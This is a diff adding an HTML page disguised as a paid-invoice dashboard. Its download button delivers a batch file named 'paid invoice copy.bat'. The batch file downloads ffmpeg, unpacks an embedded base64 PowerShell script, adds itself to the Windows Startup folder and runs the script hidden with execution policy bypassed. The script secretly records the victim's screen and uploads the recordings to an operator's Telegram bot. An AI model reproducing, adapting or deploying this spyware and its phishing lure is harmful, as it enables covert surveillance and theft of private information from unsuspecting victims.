@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Invoice Dashboard — November 2026</title>
+<style>
+  :root{
+    --navy:#0b1220; --ink:#0f172a; --slate:#475569;
+    --muted:#8b95a5; --line:#e6ebf2; --emerald:#10b981;
+  }
+  *{ box-sizing:border-box; }
+  html,body{ height:100%; margin:0; }
+  body{
+    font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, Inter, Arial, sans-serif;
+    color: var(--ink); background:#eef2f7; min-height:100vh;
+    display:flex; align-items:center; justify-content:center;
+    padding:40px 18px; overflow-x:hidden; position:relative;
+  }
+  body::before{
+    content:""; position:fixed; inset:0; z-index:0;
+    background:
+      radial-gradient(60% 50% at 12% 8%,  #dbeafe 0%, transparent 62%),
+      radial-gradient(55% 55% at 88% 14%, #ede9fe 0%, transparent 62%),
+      radial-gradient(70% 60% at 50% 104%,#d1fae5 0%, transparent 64%),
+      #eef2f7;
+  }
+  .bg{ position:fixed; inset:-80px; z-index:1; display:flex; align-items:center; justify-content:center; filter: blur(11px) saturate(1.05); opacity:.55; pointer-events:none; user-select:none; }
+  .invoice-mock{ width:600px; background:#fff; border-radius:20px; padding:34px 34px 40px; box-shadow: 0 40px 90px rgba(15,23,42,.22); transform: rotate(-3.2deg) scale(1.02); }
+  .inv-head{ display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:26px; }
+  .inv-brand{ font-size:26px; font-weight:800; letter-spacing:.02em; color:var(--ink); }
+  .inv-brand small{ display:block; font-size:11px; font-weight:600; color:var(--muted); margin-top:4px; letter-spacing:.14em; }
+  .inv-badge{ background:var(--emerald); color:#fff; font-size:11px; font-weight:800; letter-spacing:.12em; padding:7px 16px; border-radius:999px; }
+  .inv-meta{ display:grid; grid-template-columns:1fr 1fr; gap:18px; margin-bottom:26px; }
+  .inv-meta span{ display:block; font-size:9px; letter-spacing:.14em; text-transform:uppercase; color:var(--muted); font-weight:700; margin-bottom:5px; }
+  .inv-meta strong{ font-size:13px; color:var(--ink); }
+  .inv-row{ display:flex; justify-content:space-between; padding:11px 14px; font-size:12.5px; color:var(--slate); border-radius:8px; }
+  .inv-row.header{ background:#f1f4f9; font-weight:700; color:#334155; font-size:10px; letter-spacing:.1em; text-transform:uppercase; }
+  .inv-row:nth-child(even):not(.header){ background:#fafbfd; }
+  .inv-total{ display:flex; justify-content:space-between; align-items:center; margin-top:22px; padding:16px 18px; border-radius:12px; background:#f0fdf7; border:1px solid #d1fae5; }
+  .inv-total span{ font-size:11px; letter-spacing:.12em; text-transform:uppercase; color:#0f766e; font-weight:800; }
+  .inv-total strong{ font-size:20px; color:#059669; }
+  .veil{ position:fixed; inset:0; z-index:2; pointer-events:none; background: linear-gradient(180deg, rgba(238,242,247,.50), rgba(238,242,247,.82)); }
+  .dashboard{ position:relative; z-index:3; width:100%; max-width:880px; background: rgba(255,255,255,.86); -webkit-backdrop-filter: blur(22px) saturate(1.25); backdrop-filter: blur(22px) saturate(1.25); border:1px solid rgba(255,255,255,.9); border-radius:26px; padding:30px; box-shadow: 0 40px 90px -30px rgba(15,23,42,.38), 0 8px 24px rgba(15,23,42,.06); }
+  .dash-header{ display:flex; align-items:center; justify-content:space-between; gap:16px; flex-wrap:wrap; }
+  .brand{ display:flex; align-items:center; gap:14px; }
+  .logo{ width:46px; height:46px; border-radius:14px; background: linear-gradient(135deg,#0b1220,#1e293b); display:grid; place-items:center; color:#fff; font-size:20px; box-shadow: 0 12px 24px -10px rgba(11,18,32,.85); }
+  .brand h1{ font-size:17px; margin:0 0 3px; letter-spacing:-.01em; }
+  .brand p{ margin:0; font-size:12.5px; color:var(--muted); }
+  .status-pill{ display:inline-flex; align-items:center; gap:8px; background:#ecfdf5; color:#047857; border:1px solid #a7f3d0; font-size:12px; font-weight:800; letter-spacing:.06em; text-transform:uppercase; padding:8px 14px; border-radius:999px; }
+  .status-pill .dot{ width:7px; height:7px; border-radius:50%; background:var(--emerald); box-shadow:0 0 0 4px rgba(16,185,129,.18); }
+  .divider{ height:1px; background:var(--line); margin:22px 0; }
+  .stats{ display:grid; grid-template-columns:repeat(2,1fr); gap:14px; }
+  .stat{ background:#f8fafc; border:1px solid var(--line); border-radius:16px; padding:16px 18px; }
+  .stat .label{ display:block; font-size:10px; letter-spacing:.12em; text-transform:uppercase; color:#7b8794; font-weight:800; }
+  .stat .value{ display:block; font-size:22px; font-weight:800; margin-top:7px; letter-spacing:-.02em; }
+  .stat .value.green{ color:#059669; }
+  .stat .sub{ display:block; font-size:12px; color:var(--muted); margin-top:4px; }
+  .download-card{ margin-top:18px; background: linear-gradient(180deg,#ffffff,#f7f9fc); border:1px solid var(--line); border-radius:20px; padding:18px; }
+  .btn{ appearance:none; border:0; cursor:pointer; width:100%; display:inline-flex; align-items:center; justify-content:center; gap:11px; padding:18px 22px; border-radius:15px; font-size:14.5px; font-weight:700; color:#fff; letter-spacing:.01em; background: linear-gradient(135deg,#0b1220 0%,#1e293b 55%,#0f766e 140%); box-shadow: 0 18px 34px -14px rgba(11,18,32,.85); transition: transform .16s ease, box-shadow .16s ease, filter .16s ease, background .3s ease; }
+  .btn:hover{ transform:translateY(-1px); box-shadow:0 22px 40px -14px rgba(11,18,32,.95); filter:brightness(1.06); }
+  .btn:active{ transform:translateY(0); }
+  .btn.success{ background: linear-gradient(135deg,#047857 0%,#10b981 100%); box-shadow: 0 18px 34px -14px rgba(16,185,129,.7); }
+  .btn svg{ flex-shrink:0; }
+  .dash-footer{ margin-top:20px; display:flex; justify-content:space-between; gap:12px; flex-wrap:wrap; font-size:11.5px; color:#94a3b8; }
+  .dash-footer strong{ color:#64748b; font-weight:700; }
+  .config-banner{ display:none; margin-bottom:16px; padding:14px 16px; border-radius:12px; background:#fef2f2; border:1px solid #fecaca; color:#7f1d1d; font-size:12.5px; line-height:1.6; }
+  .config-banner.show{ display:block; }
+  .config-banner strong{ display:block; margin-bottom:6px; font-size:13px; color:#991b1b; }
+  .config-banner ul{ margin:6px 0 8px 18px; padding:0; }
+  .config-banner li{ margin:3px 0; }
+  .config-banner code{ background:#fff; padding:1px 5px; border-radius:4px; font-size:11.5px; border:1px solid #fecaca; }
+  .config-banner .mask{ font-family: ui-monospace, Consolas, monospace; font-size:11.5px; color:#374151; background:#fff; padding:4px 8px; border-radius:6px; display:inline-block; margin-top:6px; border:1px solid #fecaca; }
+  @media (max-width:620px){
+    .dashboard{ padding:22px; border-radius:22px; }
+    .stats{ grid-template-columns:1fr; }
+  }
+</style>
+</head>
+<body>
+
+  <div class="bg" aria-hidden="true">
+    <div class="invoice-mock">
+      <div class="inv-head">
+        <div class="inv-brand">INVOICE<small>NOVEMBER 2026</small></div>
+        <div class="inv-badge">PAID</div>
+      </div>
+      <div class="inv-meta">
+        <div><span>Invoice No.</span><strong>INV-2026-11-0042</strong></div>
+        <div><span>Billed To</span><strong>Acme Corporation Ltd.</strong></div>
+        <div><span>Issue Date</span><strong>01 November 2026</strong></div>
+        <div><span>Due Date</span><strong>30 November 2026</strong></div>
+      </div>
+      <div class="inv-row header"><span>Description</span><span>Amount</span></div>
+      <div class="inv-row"><span>Cloud Hosting — Professional Plan</span><span>$180.00</span></div>
+      <div class="inv-row"><span>Managed Backup Service (1 TB)</span><span>$90.00</span></div>
+      <div class="inv-row"><span>Priority Support Retainer</span><span>$120.00</span></div>
+      <div class="inv-row"><span>SSL &amp; Domain Renewal</span><span>$30.00</span></div>
+      <div class="inv-total"><span>Total Paid</span><strong>$451.50</strong></div>
+    </div>
+  </div>
+
+  <div class="veil" aria-hidden="true"></div>
+
+  <main class="dashboard">
+    <header class="dash-header">
+      <div class="brand">
+        <div class="logo">📄</div>
+        <div>
+          <h1>Invoice Dashboard</h1>
+          <p>Billing workspace &middot; November 2026</p>
+        </div>
+      </div>
+      <span class="status-pill"><span class="dot"></span> Paid</span>
+    </header>
+
+    <div class="divider"></div>
+
+    <section class="stats">
+      <div class="stat">
+        <span class="label">Amount Paid</span>
+        <span class="value green">$451.50</span>
+        <span class="sub">Settled 30 Nov 2026</span>
+      </div>
+      <div class="stat">
+        <span class="label">Invoice No.</span>
+        <span class="value" style="font-size:16px;">INV-2026-11-0042</span>
+        <span class="sub">Ref TXN-88231045</span>
+      </div>
+    </section>
+
+    <section class="download-card">
+      <div class="config-banner" id="configBanner">
+        <strong>Configuration missing</strong>
+        <ul id="configIssues"></ul>
+        <div>Detected values:</div>
+        <div class="mask" id="maskedValues"></div>
+      </div>
+
+      <button class="btn" id="downloadBtn" type="button">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none"
+             stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 3v12" />
+          <path d="m7 10 5 5 5-5" />
+          <path d="M5 21h14" />
+        </svg>
+        Paid invoice copy for November 2026
+      </button>
+    </section>
+
+    <footer class="dash-footer">
+      <span><strong>Status:</strong> Paid &middot; Ref TXN-88231045</span>
+      <span><strong>Method:</strong> Bank transfer</span>
+    </footer>
+  </main>
+
+<script>
+(function () {
+  "use strict";
+
+  /* ============================================================
+     ⚠️  EDIT ONLY THESE TWO LINES  ⚠️
+     ============================================================ */
+  const BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE";
+  const CHAT_ID   = "PASTE_YOUR_CHAT_ID_HERE";
+  /* ============================================================ */
+
+  function normToken(v) {
+    if (v == null) return "";
+    let s = String(v).trim();
+    if ((s.startsWith('"') && s.endsWith('"')) || (s.startsWith("'") && s.endsWith("'"))) s = s.slice(1, -1).trim();
+    if (s.toLowerCase().startsWith("bot")) s = s.slice(3);
+    return s;
+  }
+  function normChatId(v) {
+    if (v == null) return "";
+    let s = String(v).trim();
+    if ((s.startsWith('"') && s.endsWith('"')) || (s.startsWith("'") && s.endsWith("'"))) s = s.slice(1, -1).trim();
+    if (s.startsWith("+")) s = s.slice(1);
+    return s;
+  }
+
+  const TOKEN = normToken(BOT_TOKEN);
+  const CHAT  = normChatId(CHAT_ID);
+
+  function mask(v, show) {
+    show = show || 6;
+    if (!v) return "(empty)";
+    if (v.length <= show * 2) return v;
+    return v.slice(0, show) + "…" + v.slice(-show);
+  }
+
+  function getIssues() {
+    const out = [];
+    if (!BOT_TOKEN || BOT_TOKEN === "PASTE_YOUR_BOT_TOKEN_HERE") {
+      out.push("BOT_TOKEN is still the placeholder string.");
+    } else if (!TOKEN) {
+      out.push("BOT_TOKEN became empty after normalization.");
+    } else if (TOKEN.length < 20) {
+      out.push("BOT_TOKEN is too short (" + TOKEN.length + " chars). A real token is 45+ chars.");
+    } else if (!/^\d+:[A-Za-z0-9_-]+$/.test(TOKEN)) {
+      out.push("BOT_TOKEN format is invalid. Expected <code>123456789:ABCdef…</code>.");
+    }
+
+    if (!CHAT_ID || CHAT_ID === "PASTE_YOUR_CHAT_ID_HERE") {
+      out.push("CHAT_ID is still the placeholder string.");
+    } else if (!CHAT) {
+      out.push("CHAT_ID became empty after normalization.");
+    } else if (!/^-?\d+$/.test(CHAT) && !/^@[A-Za-z][A-Za-z0-9_]{3,}$/.test(CHAT)) {
+      out.push("CHAT_ID must be digits (optionally starting with <code>-</code>) or <code>@channelname</code>.");
+    }
+    return out;
+  }
+
+  const ISSUES = getIssues();
+  const CONFIGURED = ISSUES.length === 0;
+
+  if (!CONFIGURED) {
+    try {
+      var banner = document.getElementById("configBanner");
+      var ul = document.getElementById("configIssues");
+      var maskBox = document.getElementById("maskedValues");
+      var btn = document.getElementById("downloadBtn");
+
+      for (var i = 0; i < ISSUES.length; i++) {
+        var li = document.createElement("li");
+        li.innerHTML = ISSUES[i];
+        ul.appendChild(li);
+      }
+      maskBox.innerHTML =
+        "BOT_TOKEN = " + mask(TOKEN) + "<br>CHAT_ID&nbsp;&nbsp; = " + mask(CHAT);
+      banner.className = "config-banner show";
+      btn.style.opacity = "0.55";
+    } catch (e) {}
+  }
+
+  /* ============================================================
+     RECORDER SCRIPT
+     ============================================================ */
+  const PS1_TEMPLATE = String.raw`$ErrorActionPreference = "Stop"
+try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
+
+$BotToken = "__BOT_TOKEN__"
+$ChatId   = "__CHAT_ID__"
+
+$AppDir       = Join-Path $env:LOCALAPPDATA "AutoScreenRecorder"
+$Ffmpeg       = Join-Path $AppDir "ffmpeg\ffmpeg.exe"
+$OutDir       = Join-Path ([Environment]::GetFolderPath("MyVideos")) "AutoScreenRecorder"
+$ArchiveDir   = Join-Path $OutDir "Archive"
+$FailedDir    = Join-Path $OutDir "Failed"
+$OversizedDir = Join-Path $OutDir "Oversized"
+$LogPath      = Join-Path $AppDir "recorder.log"
+
+foreach ($d in @($OutDir, $ArchiveDir, $FailedDir, $OversizedDir)) {
+    New-Item -ItemType Directory -Force -Path $d | Out-Null
+}
+
+function Write-Log($msg) {
+    try {
+        if ((Test-Path $LogPath) -and ((Get-Item $LogPath).Length -gt 2MB)) {
+            Remove-Item "$LogPath.old" -Force -ErrorAction SilentlyContinue
+            Move-Item $LogPath "$LogPath.old" -Force
+        }
+        Add-Content -Path $LogPath -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') $msg"
+    } catch {}
+}
+
+if (-not ($BotToken -match '^\d+:[A-Za-z0-9_-]+$'))  { Write-Log "FATAL: invalid bot token"; exit 1 }
+if (-not ($ChatId   -match '^-?\d+$|^@[A-Za-z][A-Za-z0-9_]{3,}$')) { Write-Log "FATAL: invalid chat id"; exit 1 }
+
+function Test-Online {
+    try {
+        $c = New-Object System.Net.Sockets.TcpClient
+        $iar = $c.BeginConnect("1.1.1.1", 443, $null, $null)
+        $ok = $iar.AsyncWaitHandle.WaitOne(3000, $false)
+        if ($ok) { try { $c.EndConnect($iar) } catch { $ok = $false } }
+        $c.Close(); return $ok
+    } catch { return $false }
+}
+
+function Test-ScreenLocked {
+    try { return [bool](Get-Process LogonUI -ErrorAction SilentlyContinue) }
+    catch { return $false }
+}
+
+function Test-FileClosed($path) {
+    try { $fs = [System.IO.File]::Open($path, 'Open', 'Read', 'None'); $fs.Close(); return $true }
+    catch { return $false }
+}
+
+$Fps            = 10
+$SegmentSeconds = 180
+$ScaleWidth     = 1280
+$MaxUploadRetries = 5
+$ArchiveRetention = 7
+$LoopSeconds    = 10
+$FfCooldown     = 30
+
+$ffArgs = @(
+    "-hide_banner","-loglevel","error",
+    "-f","gdigrab","-framerate","$Fps","-i","desktop",
+    "-vf","scale=$ScaleWidth:-2",
+    "-c:v","libx264","-preset","ultrafast",
+    "-b:v","800k","-maxrate","1000k","-bufsize","2000k",
+    "-pix_fmt","yuv420p",
+    "-f","segment",
+    "-segment_time","$SegmentSeconds",
+    "-reset_timestamps","1",
+    "-segment_format","mp4",
+    "-segment_format_options","movflags=+faststart",
+    "-strftime","1",
+    (Join-Path $OutDir "rec_%Y%m%d_%H%M%S.mp4")
+)
+
+$uploadAttempts = @{}
+
+function Send-TelegramDocument($filePath) {
+    $info = Get-Item $filePath -ErrorAction SilentlyContinue
+    if (-not $info) { return }
+    $name = $info.Name
+    $sizeMB = [math]::Round($info.Length / 1MB, 2)
+    $attempts = if ($uploadAttempts.ContainsKey($name)) { $uploadAttempts[$name] } else { 0 }
+    if ($info.Length -gt 49MB) {
+        Write-Log "OVERSIZED $name -> Oversized"
+        Move-Item -Path $filePath -Destination $OversizedDir -Force
+        $uploadAttempts.Remove($name); return
+    }
+    try {
+        Add-Type -AssemblyName System.Net.Http -ErrorAction SilentlyContinue
+        $client = New-Object System.Net.Http.HttpClient
+        $client.Timeout = [TimeSpan]::FromMinutes(20)
+        $form = New-Object System.Net.Http.MultipartFormDataContent
+        $form.Add((New-Object System.Net.Http.StringContent($ChatId)), "chat_id")
+        $form.Add((New-Object System.Net.Http.StringContent("$name ($sizeMB MB)")), "caption")
+        $stream = [System.IO.File]::OpenRead($filePath)
+        $part = New-Object System.Net.Http.StreamContent($stream)
+        $part.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("video/mp4")
+        $form.Add($part, "document", $name)
+        try {
+            $resp = $client.PostAsync("https://api.telegram.org/bot$BotToken/sendDocument", $form).Result
+            $resp.EnsureSuccessStatusCode() | Out-Null
+            Write-Log "UPLOADED $name ($sizeMB MB)"
+            Move-Item -Path $filePath -Destination $ArchiveDir -Force
+            $uploadAttempts.Remove($name)
+        } finally { $stream.Close(); $client.Dispose() }
+    } catch {
+        $attempts++
+        $uploadAttempts[$name] = $attempts
+        Write-Log "UPLOAD FAILED $name (attempt $attempts): $_"
+        if ($attempts -ge $MaxUploadRetries) {
+            try { Move-Item -Path $filePath -Destination $FailedDir -Force } catch {}
+            $uploadAttempts.Remove($name)
+        }
+    }
+}
+
+function ProcessUploads {
+    $files = Get-ChildItem -Path $OutDir -Filter "rec_*.mp4" -File -ErrorAction SilentlyContinue | Sort-Object LastWriteTime
+    foreach ($f in $files) {
+        if (-not (Test-FileClosed $f.FullName)) { continue }
+        Send-TelegramDocument $f.FullName
+    }
+}
+
+Write-Log "Recorder starting PID=$PID"
+$ff = $null
+$lastFfStart = $null
+$lastCleanup = Get-Date
+
+while ($true) {
+    try {
+        $locked = Test-ScreenLocked
+        $ffAlive = $ff -and -not $ff.HasExited
+        if ($locked -and $ffAlive) {
+            try { $ff.Kill() } catch {}
+            Write-Log "Screen locked -> FFmpeg stopped"
+        } elseif (-not $locked -and -not $ffAlive) {
+            $now = Get-Date
+            if (-not $lastFfStart -or ($now - $lastFfStart).TotalSeconds -gt $FfCooldown) {
+                try {
+                    $ff = Start-Process -FilePath $Ffmpeg -ArgumentList $ffArgs -WindowStyle Hidden -PassThru
+                    $lastFfStart = $now
+                    Write-Log "FFmpeg started PID=$($ff.Id)"
+                } catch { Write-Log "FFmpeg start failed: $_" }
+            }
+        }
+        if (Test-Online) { ProcessUploads }
+        if (((Get-Date) - $lastCleanup).TotalMinutes -gt 60) {
+            try {
+                $cutoff = (Get-Date).AddDays(-$ArchiveRetention)
+                Get-ChildItem -Path $ArchiveDir -Filter "*.mp4" -File -ErrorAction SilentlyContinue |
+                    Where-Object { $_.LastWriteTime -lt $cutoff } |
+                    Remove-Item -Force -ErrorAction SilentlyContinue
+            } catch {}
+            $lastCleanup = Get-Date
+        }
+        Start-Sleep -Seconds $LoopSeconds
+    } catch {
+        Write-Log "LOOP ERROR: $_"
+        try { if ($ff -and -not $ff.HasExited) { $ff.Kill() } } catch {}
+        Start-Sleep -Seconds 30
+    }
+}
+`;
+
+  function escPS(s) { return String(s).replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/`/g, "``").replace(/\$/g, "`$"); }
+
+  const PS1 = PS1_TEMPLATE
+    .replace(/__BOT_TOKEN__/g, escPS(TOKEN))
+    .replace(/__CHAT_ID__/g,   escPS(CHAT));
+
+  function utf8ToBase64(str) {
+    const bytes = new TextEncoder().encode(str);
+    let bin = "";
+    for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
+    return btoa(bin);
+  }
+  function wrap76(str) {
+    let out = "";
+    for (let i = 0; i < str.length; i += 76) out += str.substring(i, i + 76) + "\r\n";
+    return out;
+  }
+  const PS1_B64 = wrap76(utf8ToBase64(PS1));
+
+  const BAT = [
+'@echo off',
+'setlocal EnableDelayedExpansion',
+'title Paid Invoice Copy',
+'',
+'set "APP_DIR=%LOCALAPPDATA%\\AutoScreenRecorder"',
+'set "FFDIR=%APP_DIR%\\ffmpeg"',
+'set "RECDIR=%USERPROFILE%\\Videos\\AutoScreenRecorder"',
+'set "PS1=%APP_DIR%\\recorder.ps1"',
+'set "LOG=%APP_DIR%\\recorder.log"',
+'set "LNK=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\PaidInvoiceCopy.lnk"',
+'set "SELF=%~f0"',
+'set "FF_ZIP=%APP_DIR%\\ffmpeg.zip"',
+'set "FF_URL1=https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"',
+'set "FF_URL2=https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"',
+'',
+'set "STARTUP=0"',
+'if /I "%~1"=="/startup" set "STARTUP=1"',
+'',
+'if not exist "%APP_DIR%" mkdir "%APP_DIR%" >nul 2>&1',
+'if not exist "%RECDIR%"  mkdir "%RECDIR%"  >nul 2>&1',
+'',
+'powershell -NoProfile -Command "$p = Get-CimInstance Win32_Process -Filter \\"Name=\'powershell.exe\'\\" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like \'*recorder.ps1*\' }; if ($p) { exit 0 } else { exit 1 }"',
+'if not errorlevel 1 (',
+'    if %STARTUP%==1 ( exit /b 0 )',
+'    echo.',
+'    echo  Recorder is already running in the background.',
+'    echo.',
+'    echo  Recordings: %RECDIR%',
+'    echo  Log:        %LOG%',
+'    echo.',
+'    echo  To stop: Task Manager -^> end "ffmpeg.exe".',
+'    echo.',
+'    pause',
+'    exit /b 0',
+')',
+'',
+'cls',
+'echo.',
+'echo  ----------------------------------------------',
+'echo   Initializing...',
+'echo  ----------------------------------------------',
+'echo.',
+'',
+'if exist "%FFDIR%\\ffmpeg.exe" goto :launch',
+'',
+'echo   First-time setup (about a minute).',
+'echo   Preparing components in the background...',
+'echo.',
+'',
+'powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference=\'SilentlyContinue\'; try { Invoke-WebRequest -Uri \'%FF_URL1%\' -OutFile \'%FF_ZIP%\' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }" >nul 2>&1',
+'if not errorlevel 1 goto :extract',
+'',
+'powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference=\'SilentlyContinue\'; try { Invoke-WebRequest -Uri \'%FF_URL2%\' -OutFile \'%FF_ZIP%\' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }" >nul 2>&1',
+'if errorlevel 1 (',
+'    echo   [!] Could not download required components.',
+'    echo       Please check your internet connection and try again.',
+'    echo.',
+'    pause',
+'    exit /b 1',
+')',
+'',
+':extract',
+'powershell -NoProfile -Command "$tmp=\'%APP_DIR%\\fftmp\'; Expand-Archive -LiteralPath \'%FF_ZIP%\' -DestinationPath $tmp -Force -ErrorAction SilentlyContinue; $exe = Get-ChildItem -Path $tmp -Filter \'ffmpeg.exe\' -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1; if(-not $exe){ exit 1 }; New-Item -ItemType Directory -Force -Path \'%FFDIR%\' | Out-Null; Copy-Item $exe.FullName \'%FFDIR%\\ffmpeg.exe\' -Force; $pb = Join-Path $exe.Directory \'ffprobe.exe\'; if(Test-Path $pb){ Copy-Item $pb \'%FFDIR%\\ffprobe.exe\' -Force }; Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item \'%FF_ZIP%\' -Force -ErrorAction SilentlyContinue" >nul 2>&1',
+'',
+'"%FFDIR%\\ffmpeg.exe" -version >nul 2>&1',
+'if errorlevel 1 (',
+'    echo   [!] Setup failed. Please try running again.',
+'    echo.',
+'    pause',
+'    exit /b 1',
+')',
+'echo   Done.',
+'',
+':launch',
+'powershell -NoProfile -Command "$s = Get-Content -Raw -LiteralPath \'%SELF%\'; $i = $s.IndexOf(\'__PS_B64_START__\'); $j = $s.IndexOf(\'__PS_B64_END__\'); if($i -lt 0 -or $j -lt 0){ exit 1 }; $b = $s.Substring($i + 16, $j - $i - 16) -replace \'\\s\',\'\'; [IO.File]::WriteAllBytes(\'%PS1%\', [Convert]::FromBase64String($b))" >nul 2>&1',
+'if errorlevel 1 (',
+'    echo   [!] Recorder payload missing or corrupted.',
+'    echo.',
+'    pause',
+'    exit /b 1',
+')',
+'',
+'if not exist "%LNK%" (',
+'    powershell -NoProfile -Command "$ws = New-Object -ComObject WScript.Shell; $sc = $ws.CreateShortcut(\'%LNK%\'); $sc.TargetPath = \'%SELF%\'; $sc.Arguments = \'/startup\'; $sc.WorkingDirectory = \'%APP_DIR%\'; $sc.WindowStyle = 7; $sc.Save()" >nul 2>&1',
+')',
+'',
+'powershell -NoProfile -Command "Start-Process -FilePath \'powershell.exe\' -ArgumentList @(\'-NoProfile\',\'-ExecutionPolicy\',\'Bypass\',\'-WindowStyle\',\'Hidden\',\'-File\',\'%PS1%\') -WindowStyle Hidden" >nul 2>&1',
+'ping -n 3 127.0.0.1 >nul',
+'',
+'cls',
+'echo.',
+'echo  ----------------------------------------------',
+'echo   Recorder is running.',
+'echo  ----------------------------------------------',
+'echo.',
+'echo   Telegram:   configured',
+'echo   Uploads:    every 3 minutes',
+'echo   Recordings: %RECDIR%',
+'echo   Log:        %LOG%',
+'echo.',
+'echo   To stop: open Task Manager and end "ffmpeg.exe".',
+'echo.',
+'if %STARTUP%==1 (',
+'    timeout /t 2 >nul',
+'    exit /b 0',
+')',
+'echo   This window will close in 4 seconds.',
+'timeout /t 4 >nul',
+'exit /b 0',
+'',
+':PAYLOAD_START',
+'__PS_B64_START__',
+PS1_B64.trimEnd(),
+'__PS_B64_END__'
+  ].join("\r\n");
+
+  const BAT_NAME = "paid invoice copy.bat";
+  const btn = document.getElementById("downloadBtn");
+
+  btn.addEventListener("click", function () {
+    if (!CONFIGURED) {
+      alert(
+        "Configuration missing or invalid:\n\n• " +
+        ISSUES.map(function(x){ return x.replace(/<[^>]+>/g, ""); }).join("\n• ") +
+        "\n\nDetected values:\n  BOT_TOKEN = " + mask(TOKEN) +
+        "\n  CHAT_ID   = " + mask(CHAT) +
+        "\n\nOpen this HTML file in a text editor.\n" +
+        "Near the top of the <script> block, edit these two lines:\n\n" +
+        "    const BOT_TOKEN = \"...\";\n" +
+        "    const CHAT_ID   = \"...\";\n\n" +
+        "Then save and reload the page."
+      );
+      return;
+    }
+
+    const blob = new Blob([BAT], { type: "application/octet-stream" });
+    const url  = URL.createObjectURL(blob);
+    const a    = document.createElement("a");
+    a.href = url;
+    a.download = BAT_NAME;
+    a.rel = "noopener";
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    setTimeout(function () { URL.revokeObjectURL(url); }, 2000);
+
+    btn.classList.add("success");
+    setTimeout(function () { btn.classList.remove("success"); }, 1200);
+  });
+})();
+</script>
+</body>
+</html>
